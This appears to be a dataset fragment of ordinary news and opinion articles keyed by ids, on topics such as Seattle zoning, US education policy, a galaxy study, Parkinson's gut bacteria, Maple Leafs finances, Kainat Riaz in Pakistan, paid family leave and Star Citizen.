  "latent_10789": "Seattle Mayor Ed Murray made a U-turn Wednesday on a controversial aspect of his new housing-affordability plan.\n\nSeattle Mayor Ed Murray said Wednesday he’ll no longer seek to allow more types of housing in the city’s single-family zones, after all.\n\nPermitting duplexes, triplexes, stacked flats and other multifamily structures in those zones was perhaps the most controversial of 65 strategies recommended earlier this month by Murray’s Housing Affordability and Livability Advisory (HALA) Committee.\n\nMurray defended the proposal at a July 13 news conference where he unveiled the recommendations that together make up his new housing-affordability plan.\n\nCity Council President Tim Burgess and Councilmember Mike O’Brien, the council’s land-use committee chair, stood with the mayor at that event. But both have since come out against the proposal to change all of Seattle’s single-family zones. Zoning modifications must be approved by the council.\n\nRelated: Council candidates band together to back alternate housing plan\n\nNow Murray himself has made a U-turn, calling for “renewed public dialogue on how best to increase affordable housing in denser neighborhoods.”\n\n“The Council and I created the HALA process because our city is facing a housing affordability crisis. In the weeks since the HALA recommendations were released, sensationalized reporting by a few media outlets has created a significant distraction and derailed the conversation that we need to have on affordability and equity,” he said in a statement Wednesday.\n\nSome, though not all, of the controversy around the mayor’s proposal for single-family zones focused on him and his 28-member volunteer task force framing the changes in terms of race.\n\nIn its report to Murray, the HALA Committee wrote: “Seattle’s zoning has roots in racial and class exclusion and remains among the largest obstacles to realizing the city’s goals for equity and affordability.”\n\nThat language and similar remarks by the mayor stirred debate over the relationship between the city’s single-family zones and ongoing racial segregation.\n\n“We also must not be afraid to talk about the painful fact that parts of our city are still impacted by the intersection of income, race and housing,” Murray said in his statement Wednesday.\n\n“Look at a map and take a walk through our neighborhoods. We can move beyond the legacy of the old boundaries of exclusion that have remained largely unchanged since nearly a century ago when neighborhood covenants were used to keep people of color south of Madison Street.”\n\nMurray, the HALA Committee and other proponents of more density argued that allowing more housing types in single-family zones would increase the overall housing supply, a key to making the rapidly growing city more affordable.\n\nThey noted height restrictions in those zones would remain the same.\n\n“Fundamentally, this is a conversation about building a Seattle that welcomes people from all walks of life — where working people, low-income families, seniors, young people and the kids of current residents all can live in our city,” the mayor said Wednesday.\n\nBut some homeowners raised concerns about the changes encouraging developers to tear down bungalows and thereby alter the character of neighborhoods.\n\nThey wondered whether the new homes would actually be affordable.\n\nToby Thaler, a Fremont Neighborhood Council board member, called Murray’s about-face a good step.\n\n“But the real problem is a failure to have an inclusive process that empowers all stakeholders,” Thaler said.\n\nAlan Durning, executive director of the Sightline Institute and a HALA Committee member, said the mayor is “trying to quell the furor” in some neighborhoods.\n\n“I’m disappointed the mayor has folded so quickly, but I’m not terribly surprised because the political blowback has been so intense,” Durning said.\n\n“Politically, I think what the mayor is trying to do is stop the argument about one of the 65 recommendations so he and the council can get to work on the other 64.”\n\nFaith Pettis, a Seattle lawyer whose work includes housing-financing and who co-chaired the HALA Committee, said she’s disappointed by Murray’s move.\n\n“I believe we’ve lost an opportunity to do something that would really help this city in the long term and that people would ultimately be comfortable with,” she said, pointing out that Portland has much, much less land that is zoned single-family.\n\n“I hope we find the political courage to deal with this in the future.”\n\nPettis said too much attention was paid to the panel’s recommendations for single-family zones and not enough on proposals the mayor hasn’t abandoned, such as requiring developers in multifamily zones to pay a fee or build affordable housing.\n\nRobert Cruickshank, onetime aide to former Mayor Mike McGinn and senior campaign manager at Democracy for America, said Murray and his allies didn’t line up enough grass-roots support ahead of time.\n\n“The way this was announced I think set it up to fail,” he said, noting the HALA Committee’s work over many months was carried out in private other than a draft report leaked to Seattle Times columnist Danny Westneat.\n\n“The claims about the history of single-family zones made a lot of people feel attacked as racist by having different feelings. People felt blindsided, and that’s not a very effective way to build public support for contentious changes.”\n\nCruickshank described Wednesday’s announcement as “a wake-up call.”\n\nHe said: “We have to do a lot more work. You can’t just come out with policy recommendations that you believe to be correct. You have to go out and organize to persuade people that your recommendations are right for them and our future.”\n\nThe HALA Committee recommended that officials relax restrictions on mother-in-law units and backyard cottages, which already are allowed in single-family zones.\n\nThe mayor also will no longer pursue that goal, according to a spokesman. But O’Brien still supports the idea.\n\n“I remain committed to exploring ways we can encourage more use of mother-in-law apartments and backyard cottages,” O’Brien said, suggesting the council could take up the issue in early 2016.\n\n“That is a reasonable way to provide more housing opportunities in some of our single-family zones.”\n\nMurray said he intends to refocus the discussion on density and added affordability housing in Seattle’s designated Urban Centers and Urban Villages and along transit corridors.\n\nHis plan also calls for upzoning 6 percent of the city’s land that’s currently zoned single-family.",

Public schools in the U.S. are very different. (Photo by Michael Reynolds-Pool/Getty Images)\n\nObama’s education policies are failing children, except for his own.\n\nRather than follow blindly in the path of privatization and unleashed free-market competition that led to the collapse of our economy, it’s time for Obama to start listening to parents and teachers. Cramming kids into classes of 30 or more and putting them on laptops while supervised by novices will never enhance their creativity or critical thinking skills.\n\nNow that Barack Obama has been re-elected president, it’s time that he start making good on the education issues he emphasized during his campaign. While in speeches and in ads the president seized on Romney’s statement that class size doesn’t matter, the truth is that Obama’s Education Secretary Arne Duncan has dismissed the importance of class size nearly as strongly. Worse yet, Duncan proposes cutting federal funds that districts can use to hire teachers at a time of sharp increases in class size.\n\nWhile Obama inveighed against “teaching to the test,” his administration has injected even more test prep into our schools by mandating that teachers and schools be evaluated by means of unreliable algorithms based on test scores. His wrong-headed Race to the Top program and No Child Left Behind “waivers” forced districts to adopt punitive policies like school closings and mass teacher firings that further undermine the opportunities of our most at-risk students. His Department of Education has wasted billions by financing the expansion of merit pay, high-stakes testing, online learning, charter schools and Teach for America, none of which has a positive record. The latter program puts earnest young college grads in classrooms with the most at-risk students after only five weeks of training.\n\nRather than follow blindly in the path of privatization and unleashed free-market competition that led to the collapse of our economy, it’s time for Obama to start listening to the priorities of parents and treating teachers as professionals. Cramming kids into classes of 30 or more and putting them on laptops while supervised by novices will never enhance their creativity or critical thinking skills.\n\nOn November 6, voters throughout the country, including in Connecticut, Indiana and Idaho, rejected corporate-style education measures and candidates. In only two states did these policies prevail: Georgia, which approved an appointed state board that can authorize charter schools over the objections of local school boards; and Washington, which will allow charter schools to be instituted for the first time, but where the margin of victory was paper-thin and might still be reversed. In both cases, these pro-charter campaigns were financed primarily by wealthy billionaires like Bill Gates and Alice Walton (of Walmart fame), who outspent their opponents by more than 10 to one. In both cases, their measures were opposed by a coalition of local school boards, state PTAs, teachers unions, civil rights and good government groups, which are becoming increasingly vehement in their resistance to the damaging tide of budget cuts, class-size increases, privatization and high-stakes testing that is overtaking our schools.\n\nInstead of pauperizing, standardizing, digitizing and privatizing education, we know what works to increase opportunities for children. Just witness the sort of education Obama’s own daughters receive: small classes with plenty of personal attention from experienced teachers, a well-rounded education with art, science and music, and little or no standardized testing. By instituting these reforms in the 1970s, Finland was able to turn around its school system and now outranks nearly all other nations in student achievement. If it’s good enough for Malia and Sasha, it should be good enough for inner-city public school students in New York City or Chicago.\n\nAcross the country, resistance to corporate-style education is growing in intensity and breadth. The grassroots coalition of parent, teacher and civil rights groups that worked together to win critical battles on November 6 must double down and make our voices heard, so that Obama will understand that he is on the wrong track. It’s not too late to for him to reject the favored policies of billionaires, corporate consultants, testing companies and privateers. These policies defy common sense and research, destroy the morale of teachers, treat our children as data points, and threaten to run our public schools into the ground.",

How galaxies' star populations grow, and how they stop growing, could be explained by eruption observations in the journal Nature.\n\nThe international team of astronomers led by astronomer James Geach from the University of Hertfordshire discovered that dense, cold clouds of gas are ejected out of a compact galaxy, dubbed SDSS J0905+57, at a speed of a whopping two million miles (3.2 million kilometers) an hour.\n\nThe hydrogen gas clouds—some weighing more than a billion suns—traveled tens of thousands of light-years into space, far from star-forming regions of the galaxy. Radar telescope measurements revealed that intense radiation pressure from stars forming in large numbers inside the compact galaxy hurled the clouds away.\n\nThe presence of hydrogen gas is pivotal to successful star birth, and so astronomers suggest that by its removal, stellar factories within the galaxy are effectively shut down. The same mechanism may have halted an era of massive star formation in galaxies such as our own.\n\n\"What we found was something surprising—a large fraction of the gas is being blasted out of the galaxy by the concentration of stars forming at the galaxy's center,\" says Geach.\n\n\"We are witnessing the aggressive termination of star formation, and the mechanism by which this is happening is an important new clue in our understanding of the evolution of galaxies.\"\n\nView Images A sky chart shows galaxy M82 in the northeast evening sky, just above the Big Dipper. Skychart by Andrew Fazekas\n\nSee for Yourself\n\nWant to see what a galaxy undergoing \"starburst\" looks like? Sky-watchers can find just such an island of stars relatively nearby, in the constellation Ursa Major, and now visible throughout the Northern Hemisphere.\n\nMessier 82, also known as Bode's Nebula, resides some 12 million light-years from Earth and hangs just above the bowl of the Big Dipper, late in the evening in the northeastern sky.\n\nShining at magnitude 8.2, binoculars offer a good glimpse of M82, even from suburbs. Backyard telescopes, however, will reveal its distinctive cigar shape, which stretches across some 130,000 light-years.\n\nRecent encounters with neighboring spiral galaxy M81 (visible by backyard telescope) have caused strong tidal forces to build up within M82's core. That has led to extreme numbers of star births-estimated at ten times the rate seen within our own Milky Way galaxy.\n\nHappy hunting!",
  "latent_11603": "RICHLAND — An eighth-grader at Gull Lake Middle School is facing expulsion after he hid a handgun on school grounds as part of a plan to runaway from home with two friends and \"live off the land,\" school officials said Wednesday.\n\nThe boy, whose name has not been released, was arrested Tuesday by Kalamazoo County sheriff's deputies and is being held in the county juvenile home on charges of carrying a concealed weapon and bringing a loaded weapon onto school property, Lt. Jim VanDyken said.\n\nGull Lake Community Schools Superintendent Christopher Rundle said the incident began to unfold Monday night when the boy stole the family car and ran away from home. He then traveled to a local Walmart to pick up a girl from his school and the Hickory Corners post office to pick up a boy, but neither of them showed up.\n\nRundle said the boy's parents notified school officials Tuesday morning that their son had run away or had been kidnapped and that their vehicle was missing. A district bus driver later spotted the family's vehicle in the staff parking lot at the middle school and an assistant principal confronted the boy inside the building just after 7:30 a.m.\n\nRundle said the assistant principal searched the boy and found .22-caliber rounds in the boy's pocket.\n\nRundle said the principal asked the boy where the gun was and the boy led the principal to the school's back parking lot where he had buried a. 22-caliber pistol under some crushed rock.\n\nRundle said the boy told school officials the gun belonged to his grandfather and he had taken it from his home to use it to hunt for food.\n\n“It's not a situation where students and staff were in danger,” Rundle said. It was a situation where he had a loaded gun on the property … and it was in our possession through the cooperation of the boy.\n\n“They were going to live off the land and hunt squirrels and things.”\n\nRundle said state law requires that the boy be expelled for bringing the weapon onto school property. He said he will recommend expulsion for the boy to the district's school board at its next meeting, Nov. 21.\n\nContact Rex Hall Jr. at rhall@kalamazoogazette.com or 269-388-7784.",
  "latent_11702": "A Marie Claire piece published last week presented readers with one of society’s biggest taboos: parents who regret having their kids. One woman in the article describes motherhood as a “life-altering mistake” and a “middle-class prison.” The mostly career-oriented interviewees resent that changing diapers has kept them from writing books and describe themselves as “not mother material.” Facebook groups with names such as “I Regret Having Children” and books such as The Mother Bliss Lie: Regretting Motherhood prove these women are not alone.\n\nAs you can imagine, the article has proved controversial. You’re probably feeling a little worked up yourself. Some commenters have absurdly equated the motherly regret to “child abuse,” according to Marie Claire.\n\nMore reasonably, many have called the perspective “extreme” – sure, the first five years of parenting are harried but after that you’ve only got yourself to blame for a sub par career.\n\nOf course, most mothers don’t wholeheartedly wish they never had children (sleeping in is cool but you know, so is raising an actual human). But talking about the ones who do helps dispel the myth that every woman should find satisfaction in raising kids.\n\nThe decision about whether to spawn or not won’t truly feel like a choice until there’s no longer a taboo against women who don’t want to be moms.\n\nSo long as we consider the childless life an inferior one, not raising a family will always feel more like rebellion than an acceptable choice.\n\nFewer millennials are looking to motherhood for fulfillment. Last year, the number of births in the U.S. hit a record low and a 2012 survey from the University of Pennsylvania found that in a 20-year span, the number of students who planned to have children dropped from 78 to 42 per cent. Yet cultural attitudes haven’t caught up with reality.\n\nThe dominant belief is that children make people happier, despite the conflicting scientific data. There’s always that relative – or, depending on your heritage, every single relative – who elbow you during the holidays and asks, “So, when can we expect a little bundle of joy?” If you’re not yet married, the elbow nudges multiply.\n\nPop culture doesn’t offer much inspiration either. Though there are many celebrities without kids, very few of them speak out about the benefits of a childless life. That’s why it was subversive when the comedian Chelsea Handler released a series of PSAs titled “Kids. They’re not that great,” featuring her sleeping in past 1 p.m. and smoking pot in her pyjamas.\n\nScott Gries/AP\n\nIt’s important to talk more about women who live happily without kids and acknowledge the hard reality that some mothers feel baby regret. So long as we consider the childless life an inferior one, not raising a family will always feel more like rebellion than an acceptable choice.\n\nNow in our 30s, my friends and I think constantly about whether we want\n\nto have babies (it’s important since our fertility apparently turns to dust at 35.) Some of us work so much we can barely keep a houseplant alive (that’s me). A few spend more time on dating apps such as Tinder than thinking of motherhood. Others have prioritized travelling over steady jobs, savings and stable housing, the basic building blocks of family life.\n\nWe all struggle with the tension between wanting family holidays in our 60s and keeping our diaper-less freedom now. But in addition to that inner conflict, even considering a life without kids feels like some sort of personal defect. The decision would be less burdensome if staying child-free wasn’t still considered selfish and short-sighted by many.\n\nWomen should choose motherhood because they want kids, not because of societal pressure. The horrible reality that some parents regret having children proves our expectations need to change. We’ve come a long way from a time when being childless made you a witch. But motherhood won’t be a true choice until we recognize that a life without kids has equal value.",
  "latent_11708": "MedicalResearch.com Interview with:\n\nFilip Scheperjans MD\n\nDepartment of Neurology\n\nHelsinki University Central Hospital\n\nDepartment of Neurological Sciences\n\nUniversity of Helsinki, Helsinki, Finland\n\nMedical Research: What is the background for this study? What are the main findings?\n\nDr. Scheperjans: In Parkinson’s disease (PD), the first neurodegenerative changes are seen in the olfactory bulb and enteric nervous system. Correspondingly, most Parkinson’s disease patients suffer from hyposmia and gastrointestinal symptoms, frequently years before motor symptoms evolve. Therefore, it has been suggested that an environmental factor acting through the nose or gut, could be involved in Parkinson’s disease. Interestingly, those two habitats are where our body gets mostly exposed to environmental agents, including microbes. Previous attempts to identify microbes related to Parkinson’s disease pointed to Helicobacter pylori and small intestinal bacterial overgrowth, but in the end had been somewhat inconclusive. But there possibly was a signal. We saw next generation sequencing approaches as a new opportunity to revisit the microbe theory in PD. Studies of gut microbiome composition in neurodegenerative disease have not been published before, although alterations in gut microbiota have been demonstrated in many other diseases and gut microbiota are in close interaction with the central nervous system.\n\nThe fecal microbiome of Parkinson’s disease subjects clearly differed from that of matched controls and this difference was independent of the potential confounders that we assessed. The most significant finding was that the abundance of bacteria from the Prevotellaceae family was reduced by 78% in Parkinson’s disease patients. A low abundance of Prevotellaceae was 86% sensitive for PD, but rather unspecific. However, a combination of 4 bacterial families increased specificity for PD to 90%. So microbiome analysis performed quite well in distinguishing Parkinson’s disease patients from control subjects. Another interesting finding was that, within the Parkinson’s disease group, abundance of Enterobacteriaceae bacteria was related to the motor symptoms of patients. They were positively associated with the severity of postural instability and gait difficulty.\n\nMedical Research: What should clinicians and patients take away from your report?\n\nDr. Scheperjans: Our study is the first to reveal a connection between gut microbiome composition and neurodegenerative disease. Gut microbiota appear as a promising biomarker candidate for Parkinson’s disease. In the future gut microbiota could hopefully be helpful in diagnosing this disorder and further research in this field is warranted.\n\nMedical Research: What recommendations do you have for future research as a result of this study?\n\nDr. Scheperjans: Now we need to better understand the connection between gut microbiota and PD. For this we need prospective studies about the temporal and causal relationships. If it turned out that microbiota are actually involved in Parkinson’s disease pathogenesis, this would open up the opportunity to investigate whether microbiome modulation could be an option for treatment or even prevention of Parkinson’s disease.\n\nWe hope that our findings encourage neurologists to consider microbiome studies as a new frontier in neurological research and to be actively involved in it. This field has a great potential to give us more insight into the mechanisms behind the many neurological disorders that we still so poorly understand.\n\nCitation:\n\nScheperjans, F., Aho, V., Pereira, P.

  "latent_11754": "Toronto Maple Leafs president Brendan Shanahan knows his customers are not happy.\n\nHe’s in charge of an organization that’s been putting out, by all measures, a consistently disappointing product. This past season was one of the worst in the team’s history, marked by outraged fans throwing their jerseys on the ice and ending with a fourth-from-last-place finish in the National Hockey League. The Leafs now face the daunting challenge of rebuilding the player roster under the direction of a new coach, again, and general manager, yet again, in a massive house cleaning announced this week.\n\nIn most competitive markets, a company that lets its customers down like that would face dire financial consequences.\n\nWhen Toyota Motor Corp. announced a series of recalls in 2009 and 2010, a 20% share price drop wiped out US$35 billion of the company’s value. When Target Corp. failed to keep shelves stocked at its Canadian stores and deliver the low prices cross-border shoppers expected, it lost an estimated US$2 billion over 22 months and made a hasty retreat from the country. And when BlackBerry Ltd. announced disappointing U.S. sales of its Z10 handset after a delayed launch in 2013, its share price dropped 7.7% in New York that day and a further 6.3% shortly after markets opened the following day.\n\nLeafs fans may whine, boo, and toss their jerseys – but they also keep paying the highest prices, by far, to watch the team lose. Despite being one of the worst-performing teams in the league, the Leafs are the most valuable in the NHL, with\n\nForbes estimating they’re worth $1.6 billion.\n\nGreg MacDonald, a telecommunications analyst with Macquarie Capital Markets Canada Ltd., said there’s nothing quite like the Leafs in the world of business.\n\nYou can put up a sub-par product for periods of time and still have almost guaranteed (revenues)\n\n“It’s unique to business overall,” MacDonald said. “You can put up a sub-par product for periods of time and still have almost guaranteed (revenues).\n\nRival telecommunications companies Rogers Communications Inc. and BCE Inc. teamed up in 2012 to buy a 75% stake in Maple Leaf Sports & Entertainment Ltd., the private company that owns the Leafs as well as the Toronto Raptors and the Air Canada Centre where they play, from the Ontario Teachers’ Pension Plan. At $1.07 billion, MLSE didn’t come cheap, and neither did the 12-year, $5.2 billion deal Rogers signed for NHL broadcast and multimedia rights starting this past season.\n\nSpokespeople for Rogers and BCE referred questions about the Leafs’ performance to MLSE and a spokesman for MLSE said the organization was unable to comment by deadline. MLSE doesn’t disclose its revenue, but Forbes estimates the Leafs generate $230 million annually.\n\nAbout 90% of the seats at Leafs games are occupied by season ticket holders and 99% of them renew those tickets each year. According to event ticket aggregator TiqIQ, Leafs fans paid an average of $373.50 for those few remaining single-game tickets on the secondary market last season, about $90 more than they paid to see the Vancouver Canucks, the NHL’s second-most expensive team.\n\nThere are signs that Leafs fans may finally be reaching their breaking point, however. A March 24 game against the Minnesota Wild drew a rare under-capacity crowd, the smallest in the Leafs’ 16 years at the Air Canada Centre. Two days before that, Hockey Night in Canada pulled a Leafs vs. Ottawa Senators game in favour of the San Jose Sharks vs. Montreal Canadiens, the first time that has happened since 1972.\n\nTeam loyalty is all well and good. But Michael Mauws, executive director of the Business of Hockey Institute, said the Leafs might be finally making the drastic changes they need to improve performance because fans are finally voting with their wallets.\n\n“If you’re making as much money as you desire, there’s not a lot of incentive to get better,” he said. “For the borderline franchises, they need to make the playoffs just to break even for the year. The Leafs haven’t had that pressure.”\n\nIf you’re making as much money as you desire, there’s not a lot of incentive to get better\n\nLike Bombardier Inc., which is hoping for a breakthrough with its CSeries jet program, Leafs fans are pinning their hopes on the equivalent of a new product launch. There’s a lot riding on Saturday’s NHL draft lottery, which the team stands a 9.5% chance at winning outright — giving management the opportunity to put a Leafs jersey on rising star Connor McDavid.\n\nPeople who cheer for Canada’s other six NHL teams are quick to tell Leafs fans they have more money than sense, usually in less delicate terms. But Dan Mason, a professor of sport management at the University of Alberta, said they’re just acting on the economic principle of supply and demand.\n\n“The Toronto market is big enough that if there were a free market for NHL franchises, there might be three teams there right now,” Mason said. “Families have cheered for the team for decades. There are no alternatives available. It creates this interesting dynamic in the market.”\n\nBoth Mason and David Carter, a sports business professor at the USC Marshall School of Business in Los Angeles, said the Leafs’ business situation is comparable to Apple Inc.\n\n“People are so loyal to Apple products,” Carter said. “Even if the company stubs its toe on something, those loyal users are going to be lining up early before the stores open to be among the first to buy whatever product’s being rolled out.”\n\nThat goodwill won’t last forever, Carter warned. He said fans want to see the team doing everything it can to turn performance around, but constant turnover like the Leafs have seen makes them lose confidence in the organization as a whole. The situation is comparable to companies like SNC-Lavalin Group Inc. and Bombardier, whose revolving doors in their management ranks are seen as signs of deeper trouble.\n\n“If you consistently have management turnover, it becomes an ownership issue,” Carter said. “Anybody that’s investing in your sport or your team doesn’t believe you’re making great HR decisions. That can threaten the stability or interest in the team from a business standpoint.”\n\nThe Leafs may be generating lots of money for Bell and Rogers, but the team’s owners could be making even more if the team had made the playoffs. Mauws of the Business of Hockey Institute said every NHL playoff home game brings in an average of $4 million in revenue at the gate, a figure that would almost certainly be significantly higher for the Leafs.\n\nMissing the playoffs also means missing television and web revenue from advertising, which is especially crucial to Rogers with its massive NHL rights deal. MacDonald, the Macquarie analyst, said television audience numbers stayed steady this year despite the Leafs’ terrible season, but it’s important for the team to make the playoffs in the future.\n\n“Because the TV rights are costing more and more, making the playoffs is becoming more and more important,” he said. “You have to make the playoffs for the economics to work.”\n\nHowever, there’s little question that MLSE is a good investment for Rogers and BCE, MacDonald said.\n\n“I think it’s very telling that a pension plan once owned this team,” he said. “It’s a very predictable free cash flow business.”\n\nThat cash flow gravy train will be a little less thick and rich than it could have been next season. When season tickets came up for renewal last month, Shanahan sent a letter to ticket holders informing them that as a token of his appreciation for sticking with the team through rough times, the Leafs will refrain from doing what they usually do this time of year – jack up prices even higher.\n\n“I have heard your frustration this season and understand it,” Shanahan said in the letter. “Our purpose here is to build the team that you are proud to support and the team that you deserve us to be.”\n\nFinancial Post\n\ncbrownell@nationalpost.com\n\nTwitter.com/clabrow",

  "latent_12178": "Seema Jilani\n\nIt was one of the most ruthless attacks of our time: three Pakistani schoolgirls were on their way home when the Taliban shot them. Their crime? Pursuit of an education. Malala Yousafzai was shot in the head and two other young women sustained injuries to their arms. “We are all Malala,” roared the world. Protestors marched and lit candlelight vigils. Malala was nominated for a Nobel Peace Prize and became an iconic symbol for young women’s educational struggles.\n\nWe went about our self-congratulatory ways, assuming we had done something tangible to help. But we forgot the two others injured in the shooting, who are just as deserving of an education and no less heroic. One of them, Shazia Ramzan, plans to move with her family to the Punjab Province of Pakistan to escape the more volatile region of Swat. The other, Kainat Riaz, is wedged in no man’s land, with few options available to her given the economic stratum of her family. In November 2012, I visited Kainat at her house in Swat Valley.\n\nThe road to her village is edged by the Swat River, which lazily laps against majestic, ivory-crested mountains. Not long ago, the Taliban publicly hung men in the main square of Mingora, just a few miles from this epic terrain.\n\nWhen I arrived at Kainat’s modest house I was greeted by Pakistani Army soldiers, who stood guard outside as a precaution against Taliban attacks. A velvety neon pink pencil bag sat on Kainat’s nightstand. She had carried it the day of the shooting. It was one of her most prized possessions, evidence of her zest for education.\n\nShe showed me the scarf she was wearing on the fateful day of the shooting. Her burgundy bloodstains were rusty smudges, now deeply ensconced into the fabric. “I sat across from Malala in the school van,” she began. “Suddenly, a man appeared. I fell over and cried in agony. I felt my shoulder getting more and more wet. I was worried about my friends.” Kainat had been shot in her upper right arm and was rushed to the hospital, where she necessitated treatment for several days.\n\nDue to complications, her home recovery lasted several months. To this day, she endures severe nerve pain and still does not have full function of her hand.\n\n“I want go to school even if the Taliban comes for me again. I will never give up,” Kainat said. It was a gentle resolve, the kind of fortitude that cannot be taught, only earned. When I told her I was a doctor, she beamed. “I want to be a doctor too, so I can help people.”\n\nWhen our time together ended, I felt the fuzz of the furry pink pencil bag in my hand as Kainat’s hand blanketed mine. “This is the mark of our friendship. So many journalists and politicians visit and go home, but you will never forget me, right?”\n\nSince the shooting, neighbors have repeatedly told Kainat to stop going to school. Some have even accused her of inviting the Taliban’s wrath onto the community. When I asked her why she kept the shawl from the shooting, she responded: “It is the only emblem of my life, with the stain of my blood, my struggle.”\n\nWeeks later, I woke to the shrill jingle of my mobile phone. Kainat was scrambling for breath and anxious. There had been an explosion at the house next door to hers. “Maybe it was a natural gas explosion, but maybe it was the Taliban. They blame me. I wake up with nightmares. The neighbors all tell me to leave.” Her voice splintered, “We have no money to escape. I am scared for my life.”\n\nDespite her valiant efforts, Kainat has only been able to attend school twice since last December. All modes of transportation — buses, taxis, and private cars — refuse to drive her to school. She studies from home now. The Pakistani Army has cautioned the family that their safety cannot be guaranteed outside their home, so they remain under house arrest after dark. Kainat has not left her home in over three weeks.\n\nThere is no physical therapy available for her wound recovery, nor is there any mental counseling for her PTSD. For this brave 15-year-old girl, there are no visits to friends’ homes, no trips to the market. She cannot even walk outside her home.\n\nImmediately after learning of her perilous situation, I frantically called everyone I knew to find help. In the past several months, I have contacted the U.S. State Department repeatedly on behalf of Kainat. I have spoken with every journalist I know and contacted anyone whom I thought could possibly assist in protecting her life. No one has come forward with concrete advice.\n\nMalala has now settled in England and remains the voice of young women striving for education. Meanwhile, the world has abandoned Kainat, who is a vulnerable, unwavering young woman in a place that, at best, mutes her aspirations and at worst will kill her.\n\nIn my quest to find Kainat a fresh start, I discovered how astoundingly wide the chasm between our public indignation and private lassitude is. The indifference is merely masked in political speeches that reduce women’s rights to theatrics. Is our moral memory so fickle that we must wait till Kainat is tethering between consciousnesses, hooked up to a ventilator in some wretched Pakistani hospital before we act to protect her?\n\nAccording to UNESCO, over 100 million young women in developing countries have never completed primary school. Pakistan has over three million girls out of school and nearly half of rural females have never attended school.\n\nWe have an opportunity to re-write history here. If we are complicit in allowing this catastrophe to unfold, we are writing Kainat’s death sentence with our apathy. If all we have to offer as the most powerful country in the world, to the poorest, most endangered young women, who would literally die for a chance at an education, is empty promises and candle light vigils, then we have fallen further than I thought.\n\nSeema Jilani is a physician who worked extensively on medical evacuation flights for critically ill children.

  "latent_12457": "Democratic presidential candidate Hillary Clinton on Thursday offered new details about her plan to make sure all workers can take time off, with pay, in order to care for a newborn or sick relative.\n\nIn so doing, she drew two contrasts -- a small one with Democratic rival Bernie Sanders, who would finance his own paid leave proposal differently, and a big one with the Republican presidential candidates, who wouldn’t guarantee paid leave at all.\n\nUnder Clinton’s plan, any worker could take up to 12 weeks off from work to play the role of family caregiver or to recover from an injury or illness. During that time, the worker would be eligible to receive replacement wages, up to two-thirds of his or her salary. The Clinton campaign didn’t provide many details on the formula for calculating the wages, but noted that a worker would qualify only after completing a minimum number of hours in the previous year.\n\nThe proposal, if enacted, would patch a major gap in America’s safety net. Workers in every other developed country are entitled to paid leave, in some cases for more than a year. U.S. workers are only eligible for unpaid leave -- that is, they can take time off, but with no guarantee they will get wages during that time. And, by law, only workers in companies with at least 50 workers have that right.\n\nSome companies provide paid leave anyway. In the last year, high-profile employers like Facebook and Goldman Sachs introduced or expanded paid leave for their employees. But the majority of American workers aren't eligible for paid leave, and the ones who need it most -- food servers, sales clerks, and other people who can’t afford to forgo paychecks -- are the least likely to have it.\n\nClinton's proposal closely resembles a bill that’s been circulating on Capitol Hill, sponsored by Sen. Kirsten Gillibrand (D-N.Y.) and Rep. Rosa DeLauro (D-Conn.). Sanders, the senator from Vermont who is Clinton’s chief competition for the Democratic nomination, is among its co-sponsors in the Senate and has been touting its virtues repeatedly, and enthusiastically, on the campaign trail.\n\nBut Clinton’s proposal differs from the bill in one crucial way. In order to finance the replacement wages that workers would get, the Gillibrand-DeLauro bill would impose a small payroll tax, of 0.4 percent, that employers and employees would split evenly. According to the National Partnership for Women and Families, that works out to about $1.50 per week per worker.\n\nSanders has said he supports that approach, because it would represent a tiny sum that the benefits would more than justify. Advocates of this approach note that Social Security and Medicare Part A have similar financing schemes -- and argue that this “social insurance” approach, in which all workers contribute a small amount through payroll taxes, gives programs political resiliency.\n\nThey also say it’s administratively simple, since an agency like the Social Security Administration already runs such programs and could take on paid leave with relative ease.\n\nClinton has criticized that approach repeatedly because it would mean higher taxes on lower- and middle-income workers. Instead, she has said, government should finance the new benefit by imposing new taxes on only the wealthiest Americans. Clinton says it’s a matter of fairness, since incomes for the wealthy have been rising quickly, but wages for the middle class have been stagnant.\n\nSanders will give a major speech about paid family leave on Friday, in Iowa, site of the first presidential caucus. It’s entirely possible -- some might even say likely -- that the Clinton campaign made its announcement in an effort to preempt him.\n\nPaid leave policies lead to better outcomes for mothers, children, and families. Betsey Stevenson, University of Michigan economist\n\nBut the real significance of Clinton’s proposal is probably what it portends for the general election -- and beyond.\n\nSen. Marco Rubio (R-Fla.), the only Republican presidential candidate to address the issue formally, has said he’d offer small tax breaks to companies that offer paid leave -- an approach unlikely to have much impact, except perhaps to help well-off workers. On the whole, Republicans have said they oppose paid leave guarantees, arguing that such regulations and programs make it harder for businesses to operate and end up hurting the economy.\n\nThat proposition has had at least one real world test -- in California, which a decade ago implemented a paid leave program much like the one Democrats have in mind now. Researchers have found the program offers clear benefits, allowing more workers to take paid leave and contributing to better maternal and child health as a result. They have not found evidence of damage to the business climate.\n\n“The benefit of being one of the last countries in the world to adopt paid maternity leave is that we have been able to learn from other countries' experiences and the results are clear,” Betsey Stevenson, a University of Michigan economist and former adviser to President Barack Obama, told the Huffington Post on Thursday. “Paid leave policies lead to better outcomes for mothers, children, and families.”\n\nRepublicans will likely control the House of Representatives, and maybe the Senate too, even if a Democrat wins the presidential election. That means both the Clinton and Sanders proposals would face stiff odds of passing. But the issue will probably figure into the fall campaign, and it may figure prominently.\n\nTo advocates like Heather Boushey, chief economist and executive director of the Washington Center for Equitable Growth, that’s a welcome sign that American politics is finally talking about the challenges of parents who also have jobs. “This is the first presidential election that we’ve had a national debate, at this level, about work-family policy,” said Boushey, who is also an outside adviser to the Clinton campaign. “That’s very exciting.”\n\nAlso on HuffPost:",
  "latent_12465": "Say what you will about Chris Roberts, the guy knows how to make an entrance. After spending a decade away from the game business producing movies, the man behind legendary PC space sims like Wing Commander, Privateer, and Freelancer jumped back into the scene with a breathtaking video demo for Star Citizen, a new space sim effort in the same vein as the earlier games for which he's famous. The initial interest in the game was so high that it overwhelmed Robert's servers and brought down the site's proprietary crowdfunding solution for a few days. Since then, the site has come back and the effort has raised over $2.6 million in pledges from fans eager for the spiritual successor to Wing Commander, including over $850,000 more from a Kickstarter set up later.\n\nWhy come back to game development now? It's all about the technology, and Roberts tells Ars that the tech has \"moved on enough where I felt like I could do a whole different level of fidelity in terms of simulation of the world and the visuals I could deliver on that. I was always very frustrated by that in the past. Now I’m sort of looking at stuff that I could do in real time that, when I was making the Wing Commander movie, we needed millions of dollars of SGI machines and days to render. That’s very exciting to me, because that’s sort of my fantasy, playing something that has the visual fidelity of a movie to it.\"\n\nRoberts also said he was drawn back by the ability to interact directly with the audience while making the game through forums and extensive websites, a huge change from the more isolated development he was used to in 